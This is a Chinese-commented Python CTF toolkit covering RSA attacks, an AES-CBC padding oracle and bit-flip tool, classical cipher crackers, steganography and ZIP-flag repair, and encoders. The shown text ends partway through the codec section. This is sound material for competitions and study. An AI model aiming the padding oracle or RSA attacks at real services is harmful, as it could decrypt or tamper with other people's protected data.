#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CTF夺旗赛实战工具包 (CTF Toolkit)
===================================

本工具包集成了CTF竞赛中常用的各类工具，包括：
1. 通用Flag提交器框架
2. RSA常用攻击工具（共模攻击、低指数攻击、Wiener攻击）
3. AES-CBC Padding Oracle攻击工具
4. 古典密码自动破解工具（频率分析、暴力破解）
5. 隐写分析工具（LSB提取、图片尾部数据提取）
6. 编码解码工具集（Base16/32/58/64/85、URL、Morse、Hex）
7. pwntools风格exploit模板（栈溢出、格式化字符串、ROP链构造）

作者: CTF学习者
日期: 2026-09-11
用途: 仅用于CTF竞赛和安全学习，禁止用于非法用途

依赖安装:
    pip install pycryptodome gmpy2 pwntools requests base58 pillow numpy

使用方法:
    python ctf_toolkit.py --help
    python ctf_toolkit.py --module rsa --attack common_modulus ...
"""

import argparse
import os
import sys
import struct
import base64
import binascii
import hashlib
import itertools
import string
import time
import re
import zlib
from collections import Counter

# ============================================================================
# 第一部分：通用Flag提交器框架
# ============================================================================

class FlagSubmitter:
    """
    通用Flag提交器框架

    用于向CTF平台提交Flag，支持多种提交方式。
    提供统一的接口，方便在不同CTF平台间切换。
    """

    def __init__(self, platform='generic', api_url=None, token=None):
        """
        初始化Flag提交器

        参数:
            platform: CTF平台名称 ('generic', 'ctfd', 'buuoj', 'xctf')
            api_url: 平台API地址
            token: API令牌或Cookie
        """
        self.platform = platform
        self.api_url = api_url
        self.token = token
        self.submitted_flags = []  # 已提交的Flag记录
        self.success_count = 0     # 成功提交计数
        self.fail_count = 0        # 失败提交计数

    def validate_flag(self, flag, pattern=r'flag\{[^}]+\}'):
        """
        验证Flag格式是否正确

        参数:
            flag: 待验证的Flag字符串
            pattern: 正则表达式匹配模式

        返回:
            bool: 是否匹配Flag格式
        """
        if not flag:
            return False
        # 支持多种Flag格式
        patterns = [
            r'flag\{[^}]+\}',       # flag{...}
            r'CTF\{[^}]+\}',        # CTF{...}
            r'FLAG\{[^}]+\}',       # FLAG{...}
            r'[a-zA-Z0-9_]+\{[^}]+\}',  # 通用格式 xxx{...}
        ]
        for p in patterns:
            if re.match(p, flag.strip()):
                return True
        return False

    def submit(self, flag, challenge_id=None):
        """
        提交Flag到CTF平台

        参数:
            flag: Flag字符串
            challenge_id: 题目ID（某些平台需要）

        返回:
            dict: 提交结果 {'success': bool, 'message': str}
        """
        # 去除空白字符
        flag = flag.strip()

        # 验证Flag格式
        if not self.validate_flag(flag):
            return {'success': False, 'message': 'Flag格式不正确'}

        # 记录提交
        record = {
            'flag': flag,
            'challenge_id': challenge_id,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'success': False
        }

        try:
            if self.platform == 'generic':
                # 通用模式：仅验证不提交
                result = {'success': True, 'message': 'Flag格式验证通过'}
            elif self.platform == 'ctfd':
                # CTFd平台提交
                result = self._submit_ctfd(flag, challenge_id)
            elif self.platform == 'buuoj':
                # BUUCTF平台提交
                result = self._submit_buuoj(flag, challenge_id)
            else:
                result = {'success': False, 'message': f'不支持的平台: {self.platform}'}
        except Exception as e:
            result = {'success': False, 'message': f'提交异常: {str(e)}'}

        # 更新统计
        record['success'] = result['success']
        if result['success']:
            self.success_count += 1
        else:
            self.fail_count += 1
        self.submitted_flags.append(record)

        return result

    def _submit_ctfd(self, flag, challenge_id):
        """CTFd平台Flag提交（需要requests库）"""
        try:
            import requests
        except ImportError:
            return {'success': False, 'message': '需要安装requests库'}

        headers = {
            'Authorization': f'Token {self.token}',
            'Content-Type': 'application/json'
        }
        data = {
            'challenge_id': challenge_id,
            'submission': flag
        }
        response = requests.post(
            f'{self.api_url}/api/v1/challenges/attempt',
            json=data, headers=headers, timeout=10
        )
        result = response.json()
        if result.get('success'):
            return {'success': True, 'message': '提交成功！'}
        else:
            return {'success': False, 'message': result.get('message', '提交失败')}

    def _submit_buuoj(self, flag, challenge_id):
        """BUUCTF平台Flag提交（需要requests库）"""
        try:
            import requests
        except ImportError:
            return {'success': False, 'message': '需要安装requests库'}

        headers = {'Cookie': self.token}
        data = {'flag': flag}
        response = requests.post(
            f'{self.api_url}/api/v1/submit',
            data=data, headers=headers, timeout=10
        )
        if '成功' in response.text:
            return {'success': True, 'message': '提交成功！'}
        else:
            return {'success': False, 'message': '提交失败，Flag可能不正确'}

    def print_stats(self):
        """打印提交统计信息"""
        print("\n" + "=" * 50)
        print("Flag提交统计")
        print("=" * 50)
        print(f"成功: {self.success_count} 次")
        print(f"失败: {self.fail_count} 次")
        print(f"总计: {self.success_count + self.fail_count} 次")
        print("=" * 50)


# ============================================================================
# 第二部分：RSA常用攻击工具
# ============================================================================

class RSAAttacker:
    """
    RSA常用攻击工具集

    实现了CTF中常见的RSA攻击方法：
    - 共模攻击 (Common Modulus Attack)
    - 低加密指数攻击 (Low Exponent Attack)
    - Wiener攻击 (低解密指数攻击)
    - 广播攻击 (Broadcast Attack)
    - Fermat因式分解 (Fermat Factorization)
    """

    @staticmethod
    def extended_gcd(a, b):
        """
        扩展欧几里得算法
        返回 (g, x, y) 使得 a*x + b*y = g = gcd(a, b)

        参数:
            a, b: 两个整数
        返回:
            (gcd, x, y)
        """
        if a == 0:
            return b, 0, 1
        g, x, y = RSAAttacker.extended_gcd(b % a, a)
        return g, y - (b // a) * x, x

    @staticmethod
    def long_to_bytes(n):
        """将大整数转换为字节串"""
        hex_str = hex(n)[2:]
        if len(hex_str) % 2:
            hex_str = '0' + hex_str
        return binascii.unhexlify(hex_str)

    @staticmethod
    def bytes_to_long(s):
        """将字节串转换为大整数"""
        return int(binascii.hexlify(s), 16)

    @staticmethod
    def common_modulus_attack(n, e1, c1, e2, c2):
        """
        RSA共模攻击

        条件: 同一明文用相同模数n、不同公钥e1和e2加密
        原理: 利用扩展欧几里得算法找到s1, s2使得 s1*e1 + s2*e2 = 1
        然后计算 m = c1^s1 * c2^s2 mod n

        参数:
            n:  共同的模数
            e1: 第一个公钥指数
            c1: 第一个密文
            e2: 第二个公钥指数
            c2: 第二个密文
        返回:
            bytes: 解密后的明文
        """
        print("[*] 开始共模攻击...")

        # 扩展欧几里得算法求s1, s2
        g, s1, s2 = RSAAttacker.extended_gcd(e1, e2)

        if g != 1:
            print(f"[-] gcd(e1, e2) = {g}，不互质，无法使用共模攻击")
            return None

        print(f"[+] 找到系数: s1={s1}, s2={s2}")

        # 处理负指数：需要求模逆元
        if s1 < 0:
            s1 = -s1
            # 求 c1 的模逆元
            c1 = pow(c1, -1, n)
            print(f"[*] c1 求逆元完成（s1为负）")

        if s2 < 0:
            s2 = -s2
            c2 = pow(c2, -1, n)
            print(f"[*] c2 求逆元完成（s2为负）")

        # 计算 m = c1^s1 * c2^s2 mod n
        m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
        plaintext = RSAAttacker.long_to_bytes(m)

        print(f"[+] 共模攻击成功！明文: {plaintext}")
        return plaintext

    @staticmethod
    def low_exponent_attack(c, e, n, max_k=10000):
        """
        RSA低加密指数攻击

        条件: 公钥指数e很小（如e=3），且明文m满足 m^e < n
        原理: 当 m^e < n 时，c = m^e（没有取模），直接开e次方根即可
              当 m^e 略大于 n 时，可以尝试 c + k*n 开方

        参数:
            c: 密文
            e: 公钥指数（很小的值）
            n: 模数
            max_k: 尝试的最大k值
        返回:
            bytes: 解密后的明文
        """
        print(f"[*] 开始低指数攻击 (e={e})...")

        # 使用整数开方
        try:
            from gmpy2 import iroot
        except ImportError:
            # 如果没有gmpy2，使用自己实现的整数开方
            iroot = RSAAttacker._integer_nth_root

        # 首先尝试直接开方（m^e < n 的情况）
        m, is_perfect = iroot(c, e)
        if is_perfect:
            plaintext = RSAAttacker.long_to_bytes(int(m))
            print(f"[+] 直接开方成功！明文: {plaintext}")
            return plaintext

        # 尝试 c + k*n 开方（m^e 略大于 n 的情况）
        print(f"[*] 直接开方失败，尝试 c + k*n ...")
        for k in range(max_k):
            m, is_perfect = iroot(c + k * n, e)
            if is_perfect:
                plaintext = RSAAttacker.long_to_bytes(int(m))
                print(f"[+] 在 k={k} 时开方成功！明文: {plaintext}")
                return plaintext

        print(f"[-] 在 k=0..{max_k} 范围内未找到整数解")
        return None

    @staticmethod
    def _integer_nth_root(n, k):
        """整数k次方根（不依赖gmpy2的简单实现）"""
        if n < 0:
            return 0, False
        if n == 0:
            return 0, True

        # 使用牛顿法
        x = int(n ** (1.0 / k)) + 1
        while x ** k > n:
            x -= 1

        return x, (x ** k == n)

    @staticmethod
    def wiener_attack(e, n):
        """
        Wiener攻击（低解密指数攻击）

        条件: 私钥d较小 (d < n^(1/4) / 3)
        原理: 利用连分数展开 e/n，逐步逼近 d
              检查每个渐进分数是否为有效的私钥

        参数:
            e: 公钥指数
            n: 模数
        返回:
            int: 私钥d，失败返回None
        """
        print("[*] 开始Wiener攻击...")

        def continued_fraction(a, b):
            """计算a/b的连分数展开"""
            cf = []
            while b:
                q = a // b
                cf.append(q)
                a, b = b, a - q * b
            return cf

        def convergents(cf):
            """从连分数计算渐进分数"""
            convs = []
            n0, n1 = 0, 1
            d0, d1 = 1, 0
            for a in cf:
                n2 = a * n1 + n0
                d2 = a * d1 + d0
                convs.append((n2, d2))
                n0, n1 = n1, n2
                d0, d1 = d1, d2
            return convs

        # 计算e/n的连分数
        cf = continued_fraction(e, n)
        convs = convergents(cf)

        for k, d in convs:
            if k == 0:
                continue

            # 检查 phi = (e*d - 1) / k 是否为整数
            if (e * d - 1) % k != 0:
                continue

            phi = (e * d - 1) // k

            # 检查 n = p*q, p+q = n - phi + 1
            # 判别式 = (n - phi + 1)^2 - 4n 必须是完全平方数
            discriminant = (n - phi + 1) ** 2 - 4 * n
            if discriminant < 0:
                continue

            # 检查判别式是否为完全平方数
            sqrt_disc, is_perfect = RSAAttacker._integer_nth_root(discriminant, 2)
            if not is_perfect:
                continue

            p = (n - phi + 1 + sqrt_disc) // 2
            q = (n - phi + 1 - sqrt_disc) // 2

            if p * q == n:
                print(f"[+] Wiener攻击成功！私钥 d = {d}")
                return d

        print("[-] Wiener攻击失败，d可能不够小")
        return None

    @staticmethod
    def broadcast_attack(ciphertexts, moduli, e):
        """
        RSA广播攻击（Hastad广播攻击）

        条件: 相同明文m，用e个不同模数n加密
        原理: 利用中国剩余定理(CRT)恢复 m^e，然后开e次方根

        参数:
            ciphertexts: 密文列表 [c1, c2, ..., ce]
            moduli: 模数列表 [n1, n2, ..., ne]
            e: 公钥指数
        返回:
            bytes: 解密后的明文
        """
        print(f"[*] 开始广播攻击 (e={e})...")

        def crt(remainders, moduli):
            """中国剩余定理求解"""
            N = 1
            for n in moduli:
                N *= n

            result = 0
            for r, n in zip(remainders, moduli):
                Ni = N // n
                # 求逆元
                inv = pow(Ni, -1, n)
                result += r * Ni * inv

            return result % N

        # 使用CRT恢复 m^e
        m_pow_e = crt(ciphertexts, moduli)
        print(f"[+] CRT恢复完成，开始开{e}次方根...")

        # 开e次方根
        try:
            from gmpy2 import iroot
        except ImportError:
            iroot = RSAAttacker._integer_nth_root

        m, is_perfect = iroot(m_pow_e, e)
        if is_perfect:
            plaintext = RSAAttacker.long_to_bytes(int(m))
            print(f"[+] 广播攻击成功！明文: {plaintext}")
            return plaintext

        print("[-] 开方失败，明文可能不是整数")
        return None

    @staticmethod
    def fermat_factorization(n, max_iter=1000000):
        """
        Fermat因式分解

        条件: 当p和q相近时（|p-q|较小）有效
        原理: n = a^2 - b^2 = (a+b)(a-b)，寻找合适的a和b

        参数:
            n: 待分解的模数
            max_iter: 最大迭代次数
        返回:
            tuple: (p, q) 或 None
        """
        print("[*] 开始Fermat因式分解...")

        try:
            from gmpy2 import isqrt, is_square
        except ImportError:
            # 简单实现
            isqrt = lambda n: int(n ** 0.5)
            is_square = lambda n: isqrt(n) ** 2 == n

        a = isqrt(n)
        if a * a < n:
            a += 1

        for i in range(max_iter):
            b2 = a * a - n
            if b2 >= 0 and is_square(b2):
                b = isqrt(b2)
                p = a + b
                q = a - b
                if p > 1 and q > 1:
                    print(f"[+] 因式分解成功: p={p}, q={q}")
                    return p, q
            a += 1

        print(f"[-] 在 {max_iter} 次迭代内未找到因子")
        return None


# ============================================================================
# 第三部分：AES-CBC Padding Oracle攻击工具
# ============================================================================

class PaddingOracleAttacker:
    """
    AES-CBC Padding Oracle攻击工具

    利用条件:
        服务端在解密时会检查PKCS7 Padding是否正确
        并通过不同的响应（错误信息、状态码等）区分Padding正确/错误

    攻击原理:
        CBC解密: P[i] = D(C[i]) XOR C[i-1]
        修改C[i-1]的第j字节会影响P[i]的第j字节
        通过暴力枚举使Padding有效，可以推导出中间值 D(C[i])
        再与原始C[i-1]异或得到明文
    """

    def __init__(self, oracle_func=None, block_size=16):
        """
        初始化Padding Oracle攻击器

        参数:
            oracle_func: 自定义的Oracle函数，接受(密文, IV)返回bool
            block_size: AES块大小（默认16字节）
        """
        self.oracle_func = oracle_func
        self.block_size = block_size

    def padding_oracle(self, ciphertext, iv):
        """
        默认的Padding Oracle检查函数

        实际使用时需要替换为真实的Oracle请求
        参数:
            ciphertext: 密文块（16字节）
            iv: 前一个密文块或IV（16字节）
        返回:
            bool: Padding是否正确
        """
        if self.oracle_func:
            return self.oracle_func(ciphertext, iv)
        # 默认返回False（实际使用时必须替换）
        return False

    def attack(self, ciphertext, iv):
        """
        执行Padding Oracle攻击

        参数:
            ciphertext: 完整密文
            iv: 初始向量
        返回:
            bytes: 解密后的明文（不含Padding）
        """
        bs = self.block_size

        # 将密文分块
        blocks = [ciphertext[i:i+bs] for i in range(0, len(ciphertext), bs)]

        print(f"[*] 共 {len(blocks)} 个密文块，开始逐块破解...")

        plaintext = b''

        for block_idx, target_block in enumerate(blocks):
            print(f"\n[*] 正在破解第 {block_idx + 1}/{len(blocks)} 块...")

            # 前一个块（第0块用IV）
            prev_block = bytearray(iv) if block_idx == 0 else bytearray(blocks[block_idx - 1])

            # 中间值（解密后的值，还未异或前一块）
            intermediate = bytearray(bs)

            # 从最后一个字节开始向前推导
            for pos in range(bs - 1, -1, -1):
                # 当前需要构造的Padding值
                pad_val = bs - pos

                # 构造测试用的前一块
                test_prev = bytearray(bs)

                # 设置已知的中间值（通过Padding值异或）
                for i in range(pos + 1, bs):
                    test_prev[i] = intermediate[i] ^ pad_val

                found = False
                for guess in range(256):
                    test_prev[pos] = guess

                    # 检查Padding是否有效
                    if self.padding_oracle(bytes(target_block), bytes(test_prev)):
                        # 验证：如果不是最后一个字节，修改前一个字节再检查
                        if pos > 0:
                            verify_prev = bytearray(test_prev)
                            verify_prev[pos - 1] ^= 1
                            if not self.padding_oracle(bytes(target_block), bytes(verify_prev)):
                                # 假阳性，跳过
                                continue

                        # 中间值 = guess XOR pad_val
                        intermediate[pos] = guess ^ pad_val
                        # 明文字节 = 中间值 XOR 原始前一块
                        plain_byte = intermediate[pos] ^ prev_block[pos]
                        print(f"  [+] 字节 {pos}: 0x{plain_byte:02x} ({chr(plain_byte) if 32 <= plain_byte < 127 else '?'})")
                        found = True
                        break

                if not found:
                    print(f"  [-] 字节 {pos} 破解失败！")
                    return None

            # 组装当前块的明文
            for i in range(bs):
                plaintext += bytes([intermediate[i] ^ prev_block[i]])

        # 去除PKCS7 Padding
        pad_len = plaintext[-1]
        if 1 <= pad_len <= bs:
            plaintext = plaintext[:-pad_len]

        print(f"\n[+] 攻击完成！明文: {plaintext}")
        return plaintext

    @staticmethod
    def cbc_bit_flip(ciphertext, block_idx, pos, original_byte, desired_byte, block_size=16):
        """
        CBC字节翻转攻击

        通过修改前一个密文块来改变当前块的解密结果

        参数:
            ciphertext: 原始密文
            block_idx: 要修改的明文块索引
            pos: 要修改的字节位置
            original_byte: 原始明文字节值
            desired_byte: 目标明文字节值
            block_size: 块大小
        返回:
            bytes: 修改后的密文
        """
        blocks = [bytearray(ciphertext[i:i+block_size])
                  for i in range(0, len(ciphertext), block_size)]

        # 修改前一个块
        prev_idx = block_idx - 1
        blocks[prev_idx][pos] ^= original_byte ^ desired_byte

        return b''.join(bytes(b) for b in blocks)


# ============================================================================
# 第四部分：古典密码自动破解工具
# ============================================================================

class ClassicalCipherCracker:
    """
    古典密码自动破解工具

    支持的密码类型:
    - 凯撒密码（自动暴力破解）
    - 维吉尼亚密码（频率分析 + Kasiski试验）
    - 栅栏密码（暴力栏数）
    - 仿射密码（暴力a和b参数）
    - 替换密码（频率分析）
    """

    # 英文字母频率（从高到低）
    ENGLISH_FREQ = {
        'E': 12.70, 'T': 9.06, 'A': 8.17, 'O': 7.51, 'I': 6.97,
        'N': 6.75, 'S': 6.33, 'H': 6.09, 'R': 5.99, 'D': 4.25,
        'L': 4.03, 'C': 2.78, 'U': 2.76, 'M': 2.41, 'W': 2.36,
        'F': 2.23, 'G': 2.02, 'Y': 1.97, 'P': 1.93, 'B': 1.49,
        'V': 0.98, 'K': 0.77, 'J': 0.15, 'X': 0.15, 'Q': 0.10,
        'Z': 0.07,
    }

    @staticmethod
    def caesar_crack(ciphertext):
        """
        凯撒密码暴力破解

        尝试所有26种位移，返回所有可能的结果

        参数:
            ciphertext: 密文字符串
        返回:
            list: [(位移, 明文), ...]
        """
        results = []

        for shift in range(26):
            plaintext = ""
            for char in ciphertext:
                if char.isalpha():
                    base = ord('A') if char.isupper() else ord('a')
                    plaintext += chr((ord(char) - base - shift) % 26 + base)
                else:
                    plaintext += char

            # 检查是否包含常见Flag标识
            if 'flag{' in plaintext.lower() or 'ctf{' in plaintext.lower():
                print(f"[+] 凯撒位移={shift}: {plaintext}")
                results.append((shift, plaintext))

        if not results:
            # 没有找到Flag，输出所有结果供人工判断
            print("[*] 未自动识别到Flag，输出所有可能：")
            for shift in range(26):
                plaintext = ""
                for char in ciphertext:
                    if char.isalpha():
                        base = ord('A') if char.isupper() else ord('a')
                        plaintext += chr((ord(char) - base - shift) % 26 + base)
                    else:
                        plaintext += char
                print(f"  位移 {shift:2d}: {plaintext}")

        return results

    @staticmethod
    def vigenere_crack(ciphertext, max_key_len=20):
        """
        维吉尼亚密码自动破解

        步骤:
        1. 使用Kasiski试验推测密钥长度
        2. 对每个位置使用频率分析破解

        参数:
            ciphertext: 密文（仅字母）
            max_key_len: 最大密钥长度
        返回:
            tuple: (密钥, 明文) 或 None
        """
        # 预处理：只保留字母
        cipher = ''.join(c.upper() for c in ciphertext if c.isalpha())

        # 步骤1: 使用重合指数法确定密钥长度
        best_key_len = None
        best_ic = 0

        for key_len in range(1, min(max_key_len, len(cipher) // 2)):
            # 计算每个子序列的重合指数
            total_ic = 0
            for i in range(key_len):
                sub = cipher[i::key_len]
                if len(sub) < 2:
                    continue
                # 计算重合指数 IC = sum(n_i * (n_i - 1)) / (N * (N-1))
                freq = Counter(sub)
                n = len(sub)
                ic = sum(f * (f - 1) for f in freq.values()) / (n * (n - 1))
                total_ic += ic

            avg_ic = total_ic / key_len
            # 英语的重合指数约为0.065
            if abs(avg_ic - 0.065) < abs(best_ic - 0.065):
                best_ic = avg_ic
                best_key_len = key_len

        if not best_key_len:
            print("[-] 无法确定密钥长度")
            return None

        print(f"[+] 推测密钥长度: {best_key_len}")

        # 步骤2: 对每个位置进行频率分析
        key = ""
        for i in range(best_key_len):
            sub = cipher[i::best_key_len]
            # 找到使频率匹配最好的位移
            best_shift = 0
            best_score = float('inf')

            for shift in range(26):
                # 尝试解密
                decrypted = ""
                for c in sub:
                    decrypted += chr((ord(c) - ord('A') - shift) % 26 + ord('A'))

                # 计算与英语频率的卡方统计量
                freq = Counter(decrypted)
                n = len(decrypted)
                chi2 = 0
                for letter, expected_pct in ClassicalCipherCracker.ENGLISH_FREQ.items():
                    observed = freq.get(letter, 0)
                    expected = n * expected_pct / 100
                    if expected > 0:
                        chi2 += (observed - expected) ** 2 / expected

                if chi2 < best_score:
                    best_score = chi2
                    best_shift = shift

            key += chr(best_shift + ord('A'))

        print(f"[+] 推测密钥: {key}")

        # 使用密钥解密
        plaintext = ""
        ki = 0
        for char in ciphertext:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                shift = ord(key[ki % len(key)]) - ord('A')
                plaintext += chr((ord(char) - base - shift) % 26 + base)
                ki += 1
            else:
                plaintext += char

        print(f"[+] 解密结果: {plaintext}")
        return key, plaintext

    @staticmethod
    def rail_fence_crack(ciphertext, max_rails=20):
        """
        栅栏密码暴力破解

        参数:
            ciphertext: 密文
            max_rails: 最大栏数
        返回:
            list: [(栏数, 明文), ...]
        """
        results = []

        for rails in range(2, min(max_rails, len(ciphertext))):
            # 解密
            fence = [[] for _ in range(rails)]
            rail = 0
            direction = 1

            for _ in range(len(ciphertext)):
                fence[rail].append(None)
                rail += direction
                if rail == rails - 1 or rail == 0:
                    direction *= -1

            # 填入密文
            idx = 0
            for r in range(rails):
                for c in range(len(fence[r])):
                    if idx < len(ciphertext):
                        fence[r][c] = ciphertext[idx]
                        idx += 1

            # 读取
            plaintext = ""
            rail = 0
            direction = 1
            for _ in range(len(ciphertext)):
                plaintext += fence[rail].pop(0)
                rail += direction
                if rail == rails - 1 or rail == 0:
                    direction *= -1

            if 'flag{' in plaintext.lower() or 'ctf{' in plaintext.lower():
                print(f"[+] 栏数={rails}: {plaintext}")
                results.append((rails, plaintext))

        if not results:
            print("[*] 未自动识别到Flag")

        return results

    @staticmethod
    def affine_crack(ciphertext):
        """
        仿射密码暴力破解

        参数:
            ciphertext: 密文
        返回:
            list: [(a, b, 明文), ...]
        """
        # 与26互素的a值
        valid_a = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]
        results = []

        for a in valid_a:
            for b in range(26):
                a_inv = pow(a, -1, 26)
                plaintext = ""
                for char in ciphertext:
                    if char.isalpha():
                        base = ord('A') if char.isupper() else ord('a')
                        x = ord(char) - base
                        plaintext += chr((a_inv * (x - b)) % 26 + base)
                    else:
                        plaintext += char

                if 'flag{' in plaintext.lower() or 'ctf{' in plaintext.lower():
                    print(f"[+] a={a}, b={b}: {plaintext}")
                    results.append((a, b, plaintext))

        if not results:
            print("[*] 未自动识别到Flag")

        return results


# ============================================================================
# 第五部分：隐写分析工具
# ============================================================================

class StegoAnalyzer:
    """
    隐写分析工具集

    功能:
    - LSB隐写提取（从图片像素最低位提取数据）
    - 图片尾部数据提取（检测图片文件后附加的数据）
    - EXIF信息提取
    - 文件头识别
    - ZIP伪加密检测
    """

    @staticmethod
    def lsb_extract(image_path, channels='RGB', bit_order='MSB'):
        """
        从图片中提取LSB隐写数据

        参数:
            image_path: 图片路径
            channels: 提取的通道 ('R', 'G', 'B', 'RGB', 'RGBA')
            bit_order: 位顺序 ('MSB'高位在前, 'LSB'低位在前)
        返回:
            bytes: 提取的隐藏数据
        """
        try:
            from PIL import Image
        except ImportError:
            print("[-] 需要安装Pillow库: pip install pillow")
            return None

        img = Image.open(image_path)
        pixels = list(img.getdata())

        # 确定通道索引
        channel_map = {'R': 0, 'G': 1, 'B': 2, 'A': 3}
        if channels == 'RGB':
            ch_indices = [0, 1, 2]
        elif channels == 'RGBA':
            ch_indices = [0, 1, 2, 3]
        elif channels in channel_map:
            ch_indices = [channel_map[channels]]
        else:
            ch_indices = [0, 1, 2]

        # 提取LSB位
        bits = []
        for pixel in pixels:
            for ch_idx in ch_indices:
                if ch_idx < len(pixel):
                    bits.append(pixel[ch_idx] & 1)

        # 转换为字节
        data = b''
        for i in range(0, len(bits) - 7, 8):
            byte = 0
            if bit_order == 'MSB':
                for j in range(8):
                    byte = (byte << 1) | bits[i + j]
            else:  # LSB
                for j in range(8):
                    byte |= (bits[i + j] << j)

            data += bytes([byte])

            # 检测结束标记
            if len(data) > 2 and data[-2:] == b'\x00\x00':
                break

        # 尝试在提取数据中查找Flag
        if b'flag{' in data.lower() or b'ctf{' in data.lower():
            start = data.lower().find(b'flag{') if b'flag{' in data.lower() else data.lower().find(b'ctf{')
            end = data.find(b'}', start) + 1
            print(f"[+] 发现Flag: {data[start:end].decode()}")
        else:
            # 输出可打印部分
            printable = bytes(b for b in data if 32 <= b < 127)
            if printable:
                print(f"[*] 提取的可打印数据: {printable[:200]}")
            else:
                print(f"[*] 提取数据（Hex）: {data[:100].hex()}")

        return data

    @staticmethod
    def extract_trailing_data(file_path):
        """
        提取文件尾部隐藏的附加数据

        很多CTF题目会在图片/文件末尾附加其他文件
        本函数检测并提取这些附加数据

        参数:
            file_path: 文件路径
        返回:
            list: [(文件类型, 数据), ...]
        """
        # 常见文件头签名
        SIGNATURES = {
            b'PK\x03\x04': 'ZIP',
            b'PK\x05\x06': 'ZIP(空)',
            b'\x89PNG': 'PNG',
            b'\xff\xd8\xff': 'JPEG',
            b'GIF87a': 'GIF87',
            b'GIF89a': 'GIF89',
            b'%PDF': 'PDF',
            b'Rar!\x1a\x07': 'RAR',
            b'\x1f\x8b': 'GZIP',
            b'BZh': 'BZIP2',
            b'7z\xbc\xaf\x27\x1c': '7Z',
            b'\x50\x4b\x03\x04': 'ZIP',
            b'\x42\x5a\x68': 'BZIP2',
            b'\xfd\x37\x7a\x58\x5a\x00': 'XZ',
            b'\x04\x22\x4d\x18': 'LZ4',
        }

        with open(file_path, 'rb') as f:
            content = f.read()

        results = []
        print(f"[*] 文件大小: {len(content)} 字节")

        # 从文件头之后开始搜索
        for sig, name in SIGNATURES.items():
            pos = content.find(sig, 10)  # 跳过文件本身的头部
            if pos > 0:
                print(f"[+] 在偏移 {pos} 发现 {name} 文件数据")
                extracted = content[pos:]
                output_path = f'extracted_{name.lower()}_{pos}'
                with open(output_path, 'wb') as f:
                    f.write(extracted)
                print(f"  已保存到: {output_path}")
                results.append((name, extracted))

        if not results:
            print("[*] 未发现附加文件数据")

            # 检查是否在文件尾部有明文Flag
            tail = content[-200:]
            try:
                tail_str = tail.decode('ascii', errors='ignore')
                if 'flag{' in tail_str.lower() or 'ctf{' in tail_str.lower():
                    start = tail_str.lower().find('flag{')
                    if start < 0:
                        start = tail_str.lower().find('ctf{')
                    end = tail_str.find('}', start) + 1
                    print(f"[+] 文件尾部发现Flag: {tail_str[start:end]}")
            except:
                pass

        return results

    @staticmethod
    def check_zip_fake_encryption(zip_path):
        """
        检测ZIP伪加密

        ZIP伪加密原理: 修改ZIP文件中各段的加密标志位
        使解压软件认为文件加密了，但实际没有加密

        参数:
            zip_path: ZIP文件路径
        返回:
            bool: 是否存在伪加密
        """
        with open(zip_path, 'rb') as f:
            data = f.read()

        # ZIP文件头签名: PK\x03\x04
        # 偏移6处是通用标志位，bit0=1表示加密
        found = False
        pos = 0

        while True:
            pos = data.find(b'PK\x03\x04', pos)
            if pos == -1:
                break

            # 读取通用标志位
            if pos + 8 <= len(data):
                flags = struct.unpack('<H', data[pos+6:pos+8])[0]
                encrypted = flags & 0x01

                if encrypted:
                    print(f"[+] 在偏移 {pos+6} 发现加密标志 (flags=0x{flags:04x})")
                    # 尝试清除加密标志
                    new_flags = flags & 0xFFFE  # 清除bit0
                    print(f"  建议修改为: 0x{new_flags:04x}")
                    found = True

            pos += 4

        if found:
            print("[*] 检测到可能的ZIP伪加密")
            print("[*] 修复方法: 将加密标志位bit0置0")

        return found

    @staticmethod
    def fix_zip_fake_encryption(zip_path, output_path):
        """
        修复ZIP伪加密

        参数:
            zip_path: 原始ZIP文件路径
            output_path: 修复后的ZIP文件路径
        """
        with open(zip_path, 'rb') as f:
            data = bytearray(f.read())

        pos = 0
        fixed_count = 0

        while True:
            pos = data.find(b'PK\x03\x04', pos)
            if pos == -1:
                break

            if pos + 8 <= len(data):
                flags = struct.unpack('<H', data[pos+6:pos+8])[0]
                if flags & 0x01:
                    # 清除加密标志
                    new_flags = flags & 0xFFFE
                    data[pos+6:pos+8] = struct.pack('<H', new_flags)
                    fixed_count += 1

            pos += 4

        # 同时修复中央目录记录中的加密标志
        pos = 0
        while True:
            pos = data.find(b'PK\x01\x02', pos)
            if pos == -1:
                break

            if pos + 10 <= len(data):
                flags = struct.unpack('<H', data[pos+8:pos+10])[0]
                if flags & 0x01:
                    new_flags = flags & 0xFFFE
                    data[pos+8:pos+10] = struct.pack('<H', new_flags)
                    fixed_count += 1

            pos += 4

        with open(output_path, 'wb') as f:
            f.write(data)

        print(f"[+] 修复完成，共修复 {fixed_count} 处加密标志")
        print(f"  修复文件: {output_path}")


# ============================================================================
# 第六部分：编码解码工具集
# ============================================================================

class CodecToolkit:
    """
    编码解码工具集

    支持的编码:
    - Base16 (Hex)
    - Base32
    - Base58
    - Base64
    - Base85 (Ascii85)
    - URL编码
    - Hex编码
    - Morse电码
    - 自动识别
    """

    MORSE_TABLE = {
        '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
        '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
        '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
        '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
        '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
        '--..': 'Z', '.----': '1', '..---': '2', '...--': '3',
        '....-': '4', '.....': '5', '-....': '6', '--...': '7',
        '---..': '8', '----.': '9', '-----': '0',
        '.-.-.-': '.', '--..--': ',', '..--..': '?', '.----.': "'",
        '-.-.--': '!', '-..-.': '/', '-.--.': '(', '-.--.-': ')',
        '.-...': '&', '---...': ':', '-.-.-.': ';', '-...-': '=',
        '.-.-.': '+', '-....-': '-', '..--.-': '_', '.-..-.': '"',
        '...-..-': '$', '.--.-.': '@',
    }

    @staticmethod
    def base16_encode(data):
        """Base16 (十六进制) 编码"""
        if isinstance(data, str):
            data = data.encode()
        return data.hex().upper()

    @staticmethod
    def base16_decode(data):
        """Base16 (十六进制) 解码"""
        if isinstance(data, str):
            data = data.encode()
        return binascii.unhexlify(data)

    @staticmethod
    def base32_encode(data):
        """Base32 编码"""
